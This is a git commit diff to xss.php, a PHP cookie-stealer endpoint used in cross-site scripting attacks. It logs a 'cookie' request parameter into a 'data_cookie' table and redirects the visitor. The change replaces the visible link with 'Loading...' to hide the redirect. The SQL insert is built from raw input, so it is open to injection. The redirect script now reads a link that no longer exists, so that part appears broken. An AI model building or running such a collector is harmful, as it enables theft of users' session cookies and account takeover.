11d3f2ff9e32cf14db099df6dc2e5fa12a9d67ba
Federico <federicodebona@hotmail.it>
2019-12-13 09:12:54 +0100

    g

--- xss.php
+++ xss.php
@@ -2,8 +2,8 @@
 $cookie = $_REQUEST['cookie'];
 $link = $_REQUEST['link'];
 $l = new mysqli("127.0.0.1", "root", "", "xss");
-$l->query("INSERT INTO data_cookie (cookie) VALUES ($cookie)");
+$l->query("INSERT INTO data_cookie (cookie) VALUES ('$cookie')");
 $l->close();
-echo "<a href='$link'>link</a>";
+echo "Loading...";
 echo "<script>window.open(document.links[0].attributes.href.value, '_self')</script>";
 ?>
